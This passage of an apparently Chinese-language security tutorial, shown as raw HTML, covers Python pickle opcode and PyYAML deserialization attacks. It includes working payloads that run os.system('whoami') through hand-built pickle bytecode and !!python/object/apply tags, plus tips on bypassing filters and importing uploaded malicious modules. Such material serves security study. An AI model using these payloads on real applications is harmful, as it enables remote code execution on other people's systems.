class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   37: (        MARK</span><br><span class="hljs-string">   38: c            GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   53: S            STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   60: t            TUPLE      (MARK at 37)</span><br><span class="hljs-string">   61: R        REDUCE</span><br><span class="hljs-string">   62: (        MARK</span><br><span class="hljs-string">   63: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   81: )            EMPTY_TUPLE</span><br><span class="hljs-string">   82: R            REDUCE</span><br><span class="hljs-string">   83: S            STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   99: t            TUPLE      (MARK at 62)</span><br><span class="hljs-string">  100: R        REDUCE</span><br><span class="hljs-string">  101: S        STRING     &#x27;eval&#x27;</span><br><span class="hljs-string">  109: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">  110: R    REDUCE</span><br><span class="hljs-string">  111: (    MARK</span><br><span class="hljs-string">  112: S        STRING     &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">  149: t        TUPLE      (MARK at 111)</span><br><span class="hljs-string">  150: R    REDUCE</span><br><span class="hljs-string">  151: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不使用R字节码</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#x27;</span><br><br>pickletools.dis(pickletools.optimize(opcode))<br>pickle.loads(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      3</span><br><span class="hljs-string">    2: (    MARK</span><br><span class="hljs-string">    3: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   21: q        BINPUT     0</span><br><span class="hljs-string">   23: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   38: X        BINUNICODE &#x27;get&#x27;</span><br><span class="hljs-string">   46: o        OBJ        (MARK at 2)</span><br><span class="hljs-string">   47: q    BINPUT     1</span><br><span class="hljs-string">   49: 0    POP</span><br><span class="hljs-string">   50: (    MARK</span><br><span class="hljs-string">   51: h        BINGET     1</span><br><span class="hljs-string">   53: (        MARK</span><br><span class="hljs-string">   54: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   72: o            OBJ        (MARK at 53)</span><br><span class="hljs-string">   73: X        BINUNICODE &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   90: o        OBJ        (MARK at 50)</span><br><span class="hljs-string">   91: q    BINPUT     2</span><br><span class="hljs-string">   93: (    MARK</span><br><span class="hljs-string">   94: h        BINGET     0</span><br><span class="hljs-string">   96: h        BINGET     2</span><br><span class="hljs-string">   98: X        BINUNICODE &#x27;eval&#x27;</span><br><span class="hljs-string">  107: o        OBJ        (MARK at 93)</span><br><span class="hljs-string">  108: q    BINPUT     3</span><br><span class="hljs-string">  110: (    MARK</span><br><span class="hljs-string">  111: h        BINGET     3</span><br><span class="hljs-string">  113: X        BINUNICODE &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">  151: o        OBJ        (MARK at 110)</span><br><span class="hljs-string">  152: 0    POP</span><br><span class="hljs-string">  153: 0    POP</span><br><span class="hljs-string">  154: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 2</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h2><p>有时可以通过改变opcode的版本来绕过一些对字母的过滤</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pickle-8.png"></p><h1 id="PyYAML-反序列化"><a href="#PyYAML-反序列化" class="headerlink" title="PyYAML 反序列化"></a>PyYAML 反序列化</h1><h2 id="基础语法规则"><a href="#基础语法规则" class="headerlink" title="基础语法规则"></a>基础语法规则</h2><p>1：大小写敏感</p><p>2：使用空格代替tab键缩进表示层级，对齐即可表示同级</p><p>3：和python一样使用’#’注释内容</p><p>4：!!表示强制类型转换</p><p>5：一个 .yml 文件中可以有多份配置文件，用 — 隔开</p><p>更多的语法规则可以看<a href="https://pyyaml.org/wiki/PyYAMLDocumentation">官方手册</a>或<a href="https://www.runoob.com/w3cnote/yaml-intro.html">菜鸟教程</a>等</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>在PyYAML中，可以通过 <code>!!</code> 来进行类型转换</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-1.png"></p><p><code>site-packages/yaml/constructor.py</code>中可以看到基础的类型转换过程</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-comment"># PyYAML4.2b4</span><br><span class="hljs-keyword">import</span> yaml<br>data = yaml.load(<span class="hljs-string">&#x27;!!str 111&#x27;</span>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">111</span><br><span class="hljs-string">&lt;type &#x27;str&#x27;&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对应的代码如下，add_constructor定义了一些基础的类型转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">SafeConstructor.add_constructor(<br>        <span class="hljs-string">u&#x27;tag:yaml.org,2002:str&#x27;</span>,<br>        SafeConstructor.construct_yaml_str)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constructor</span>(<span class="hljs-params">cls, tag, constructor</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;yaml_constructors&#x27;</span> <span class="hljs-keyword">in</span> cls.__dict__:<br>        cls.yaml_constructors = cls.yaml_constructors.copy()<br>    cls.yaml_constructors[tag] = constructor<br>add_constructor = <span class="hljs-built_in">classmethod</span>(add_constructor)<br></code></pre></td></tr></table></figure><p>str对应的函数是 construct_yaml_str，下断点分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_yaml_str</span>(<span class="hljs-params">self, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> value.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>        <span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_scalar</span>(<span class="hljs-params">self, node</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, MappingNode):<br>        <span class="hljs-keyword">for</span> key_node, value_node <span class="hljs-keyword">in</span> node.value:<br>            <span class="hljs-keyword">if</span> key_node.tag == <span class="hljs-string">u&#x27;tag:yaml.org,2002:value&#x27;</span>:<br>                <span class="hljs-keyword">return</span> self.construct_scalar(value_node)<br>    <span class="hljs-keyword">return</span> BaseConstructor.construct_scalar(self, node)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_scalar</span>(<span class="hljs-params">self, node</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(node, ScalarNode):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>                <span class="hljs-string">&quot;expected a scalar node, but found %s&quot;</span> % node.<span class="hljs-built_in">id</span>,<br>                node.start_mark)<br>    <span class="hljs-keyword">return</span> node.value<br></code></pre></td></tr></table></figure><p>可以看到转换的过程，包括node的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-2.png"></p><p>当然除了<code>add_constructor</code>定义的基础类型外还有<code>add_multi_constructor</code>定义的5个complex python tag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/name:&#x27;</span>,<br>    Constructor.construct_python_name)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/module:&#x27;</span>,<br>    Constructor.construct_python_module)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object:&#x27;</span>,<br>    Constructor.construct_python_object)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object/apply:&#x27;</span>,<br>    Constructor.construct_python_object_apply)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object/new:&#x27;</span>,<br>    Constructor.construct_python_object_new)<br></code></pre></td></tr></table></figure><p>根据图表可以看到这几个都可以引入新的模块，这正是 PyYAML 存在反序列化漏洞的原因</p><h2 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 5.1</h2><p>PyYAML 的利用划分以版本 5.1 为界限，5.1以下利用相对较简单，5.1以上利用相对稍麻烦</p><p>&lt;5.1的版本中一共有三个构造器，分别是</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">BaseConstructor：最最基础的构造器，不支持强制类型转换<br>SafeConstructor：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改<br>Constructor：在 YAML 规范上新增了很多强制类型转换，是默认使用的构造器<br></code></pre></td></tr></table></figure><h3 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h3><p>construct_python_object_apply</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object_apply</span>(<span class="hljs-params">self, suffix, node, newobj=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># Format:</span><br>        <span class="hljs-comment">#   !!python/object/apply       # (or !!python/object/new)</span><br>        <span class="hljs-comment">#   args: [ ... arguments ... ]</span><br>        <span class="hljs-comment">#   kwds: &#123; ... keywords ... &#125;</span><br>        <span class="hljs-comment">#   state: ... state ...</span><br>        <span class="hljs-comment">#   listitems: [ ... listitems ... ]</span><br>        <span class="hljs-comment">#   dictitems: &#123; ... dictitems ... &#125;</span><br>        <span class="hljs-comment"># or short format:</span><br>        <span class="hljs-comment">#   !!python/object/apply [ ... arguments ... ]</span><br>        <span class="hljs-comment"># The difference between !!python/object/apply and !!python/object/new</span><br>        <span class="hljs-comment"># is how an object is created, check make_python_instance for details.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, SequenceNode):<br>            args = self.construct_sequence(node, deep=<span class="hljs-literal">True</span>)<br>            kwds = &#123;&#125;<br>            state = &#123;&#125;<br>            listitems = []<br>            dictitems = &#123;&#125;<br>        <span class="hljs-keyword">else</span>:<br>            value = self.construct_mapping(node, deep=<span class="hljs-literal">True</span>)<br>            args = value.get(<span class="hljs-string">&#x27;args&#x27;</span>, [])<br>            kwds = value.get(<span class="hljs-string">&#x27;kwds&#x27;</span>, &#123;&#125;)<br>            state = value.get(<span class="hljs-string">&#x27;state&#x27;</span>, &#123;&#125;)<br>            listitems = value.get(<span class="hljs-string">&#x27;listitems&#x27;</span>, [])<br>            dictitems = value.get(<span class="hljs-string">&#x27;dictitems&#x27;</span>, &#123;&#125;)<br>        <span class="hljs-comment"># 调用 make_python_instance 获取模块中的方法并执行</span><br>        instance = self.make_python_instance(suffix, node, args, kwds, newobj)<br>        <span class="hljs-keyword">if</span> state:<br>            self.set_python_instance_state(instance, state)<br>        <span class="hljs-keyword">if</span> listitems:<br>            instance.extend(listitems)<br>        <span class="hljs-keyword">if</span> dictitems:<br>            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dictitems:<br>                instance[key] = dictitems[key]<br>        <span class="hljs-keyword">return</span> instance<br></code></pre></td></tr></table></figure><p>调用 make_python_instance 获取模块中的方法并执行</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-3.png"></p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># short format形式</span><br><span class="hljs-comment"># !!python/object/apply [ ... arguments ... ]</span><br>yaml.load(<span class="hljs-string">&#x27;!!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:subprocess.Popen [&#x27;whoami&#x27;]&quot;</span>)<br><br><br><span class="hljs-comment"># 其他几种表现形式</span><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># command 是 os.system 的参数名(可以通过help(os.system)查看)</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h3><p>对应的 construct_python_object_new 只有一行代码，调用了construct_python_object_apply</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object_new</span>(<span class="hljs-params">self, suffix, node</span>):<br>    <span class="hljs-keyword">return</span> self.construct_python_object_apply(suffix, node, newobj=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>唯一不同的是newobj参数不一样，这个参数影响了 make_python_instance 中的一个判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>    <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> cls(*args, **kwds)<br></code></pre></td></tr></table></figure><p>基本不影响，所以 python&#x2F;object&#x2F;new 和 python&#x2F;object&#x2F;apply 可以看作是同一个</p><h3 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object</span>(<span class="hljs-params">self, suffix, node</span>):<br>    <span class="hljs-comment"># Format:</span><br>    <span class="hljs-comment">#   !!python/object:module.name &#123; ... state ... &#125;</span><br>    instance = self.make_python_instance(suffix, node, newobj=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">yield</span> instance<br>    deep = <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__setstate__&#x27;</span>)<br>    state = self.construct_mapping(node, deep=deep)<br>    self.set_python_instance_state(instance, state)<br></code></pre></td></tr></table></figure><p>执行 make_python_instance 时并没有传 args 或 kwds 参数，所以只能执行无参函数</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name = <span class="hljs-string">&quot;&quot;</span><br><br><br>payload1 = <span class="hljs-string">&quot;&quot;&quot;!!python/object:__main__.User</span><br><span class="hljs-string">name: aaa</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload2 = <span class="hljs-string">&quot;!!python/object:__main__.User &#123;name: aaa&#125;&quot;</span><br><br>data1 = yaml.load(payload1)<br><span class="hljs-built_in">print</span>(data1.name)<br><br>data2 = yaml.load(payload2)<br><span class="hljs-built_in">print</span>(data2.name)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">aaa</span><br><span class="hljs-string">aaa</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="python-x2F-module"><a href="#python-x2F-module" class="headerlink" title="python&#x2F;module"></a>python&#x2F;module</h3><p>代码中只调用了 find_python_module 来导入模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_module</span>(<span class="hljs-params">self, suffix, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">if</span> value:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python module&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected the empty value, but found %r&quot;</span> % value, node.start_mark)<br>    <span class="hljs-keyword">return</span> self.find_python_module(suffix, node.start_mark)<br></code></pre></td></tr></table></figure><p>虽然 construct_python_module 没有调用逻辑，但是与任意文件上传搭配有奇效</p><p>比如在upload目录下上传了恶意文件exp.py</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/python/python-pyyaml-4.png"></p><p>就可以用<code>!!python/module:upload.exp</code>来导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>yaml.load(<span class="hljs-string">&#x27;!!python/module:upload.exp&#x27;</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">root</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>一个小技巧：<br>当文件名是 __init__.py 时，直接导入目录名即可，可以绕过.的限制</p><h3 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h3><p>代码逻辑与 python&#x2F;module 非常相似，不过module只返回模块，而name返回模块下的属性和方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_name</span>(<span class="hljs-params">self, suffix, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">if</span> value:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python name&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected the empty value, but found %r&quot;</span> % value, node.start_mark)<br>    <span class="hljs-keyword">return</span> self.find_python_name(suffix, node.start_mark)<br></code></pre></td></tr></table></figure><p>这个特性常用在获取未知变量的值上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>key = <span class="hljs-string">&quot;k1y.....&quot;</span><br><br>config = <span class="hljs-string">&#x27;!!python/name:__main__.key&#x27;</span><br><span class="hljs-built_in">print</span>(yaml.load(config))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">k1y.....</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="PyYAML-gt-x3D-5-1"><a href="#PyYAML-gt-x3D-5-1" class="headerlink" title="PyYAML &gt;&#x3D; 5.1"></a>PyYAML &gt;&#x3D; 5.1</h2><p>新增的<br>1：FullConstructor：默认的构造器。<br>2：UnsafeConstructor：支持全部的强制类型转换<br>3：Constructor：等同于 UnsafeConstructor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">__all__ = [<br>    <span class="hljs-string">&#x27;BaseConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;SafeConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;FullConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;UnsafeConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;Constructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;ConstructorError&#x27;</span><br>]<br></code></pre></td></tr></table></figure><p>如果指定的构造器是 UnsafeConstructor 或者 Constructor ，那么直接用&lt;5.1的方法打就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.unsafe_load(exp)<br>yaml.unsafe_load_all(exp)<br>yaml.load(exp, Loader=Loader)<br>yaml.load(exp, Loader=UnsafeLoader)<br>yaml.load_all(exp, Loader=Loader)<br>yaml.load_all(exp, Loader=UnsafeLoader)<br></code></pre></td></tr></table></figure><h3 id="默认构造器下的利用方式"><a href="#默认构造器下的利用方式" class="headerlink" title="默认构造器下的利用方式"></a>默认构造器下的利用方式</h3><p>这里以 PyYAML&#x3D;&#x3D;5.1 为例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 